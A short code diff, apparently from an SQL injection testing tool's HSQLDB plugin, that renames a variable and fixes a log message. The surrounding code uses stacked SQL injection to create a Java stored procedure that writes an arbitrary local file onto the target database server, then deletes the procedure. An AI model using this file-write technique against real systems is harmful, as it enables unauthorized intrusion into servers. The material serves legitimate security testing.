@@ -21,13 +21,13 @@ class Filesystem(GenericFilesystem):
 
     @stackedmethod
     def stackedWriteFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
-        funcName = randomStr()
+        func_name = randomStr()
         max_bytes = 1024 * 1024
 
-        debugMsg = "creating JLP procedure '%s'" % funcName
+        debugMsg = "creating JLP procedure '%s'" % func_name
         logger.debug(debugMsg)
 
-        addFuncQuery = "CREATE PROCEDURE %s (IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(%s)) " % (funcName, max_bytes)
+        addFuncQuery = "CREATE PROCEDURE %s (IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(%s)) " % (func_name, max_bytes)
         addFuncQuery += "LANGUAGE JAVA DETERMINISTIC NO SQL "
         addFuncQuery += "EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'"
         inject.goStacked(addFuncQuery)
@@ -47,11 +47,12 @@ class Filesystem(GenericFilesystem):
         logger.debug(debugMsg)
 
         # Reference: http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_procedures
-        invokeQuery = "CALL %s('%s', CAST('%s' AS VARBINARY(%s)))" % (funcName, remoteFile, fcEncodedStr, max_bytes)
+        invokeQuery = "CALL %s('%s', CAST('%s' AS VARBINARY(%s)))" % (func_name, remoteFile, fcEncodedStr, max_bytes)
         inject.goStacked(invokeQuery)
 
-        logger.debug("cleaning up" % funcName)
-        delQuery = "DELETE PROCEDURE %s" % funcName
+        logger.debug("cleaning up the database management system")
+
+        delQuery = "DELETE PROCEDURE %s" % func_name
         inject.goStacked(delQuery)
 
         message = "the local file '%s' has been written on the back-end DBMS" % localFile
